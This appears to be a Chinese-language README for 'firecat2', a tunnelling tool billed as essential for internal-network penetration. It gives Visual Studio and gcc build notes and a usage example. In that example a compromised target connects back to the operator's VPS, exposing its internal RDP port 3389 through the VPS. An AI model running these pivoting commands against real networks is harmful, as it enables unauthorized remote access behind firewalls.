# firecat2


>内网渗透（建立数据转发隧道）必备神器，没有之一。firecat2 移除了反弹shell代码，仅保留了转发tunnel功能。


###编译环境

Microsoft Visual Studio Professional 2012

OS 
Microsoft Windows Embedded 8.1 Industry Pro

on Linux
>gcc -o firecat.exe firecat.c -lwsock32


###注意几个地方
* 配置属性-常规 字符集  使用多字节字符集
* C/C++ -常规   附加包含目录 配置问include头文件目录
* 连接器-常规   附加库目录 配置为lib库文件目录
* 配置属性-常规 平台工具集 vs-xp(可选)
* 调试时, 在监视1窗口(Watch 1)中输入 $err,hr 获取GetLastError()


###如何使用

以转发内网3389端口为例

在你的VPS机器上监听80端口和任意端口（51）
>firecat -m 0 -t 80 -s 51

在目标机上回连你的VPS
>firecat -m 1 -h yourvps -t 80 -l localip -s 3389

本地mstsc连接 127.0.0.1:51
